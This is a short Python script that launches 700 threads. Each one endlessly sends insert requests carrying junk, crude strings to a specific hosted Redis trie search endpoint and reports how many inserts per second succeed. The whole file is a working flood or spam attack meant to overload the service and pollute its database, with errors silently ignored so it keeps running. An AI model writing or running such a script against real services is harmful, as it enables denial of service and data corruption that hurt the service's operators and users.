import requests, threading, time
spamC = 0
sTime = time.time()
def call(q):
    global spamC
    while True:
        try:
            t='https://redis-trie-search.up.railway.app/insert?query=' + q +"#"+str(i)
            x = requests.get(t)
            if x.text=='inserted':
                spamC+=1
                print("Efficiency: ",spamC/(time.time()-sTime),"   #",spamC)
        except:
            pass
for i in range(700):
    t=threading.Thread(target=call, args=('fuk db @'+str(i),))
    t.start()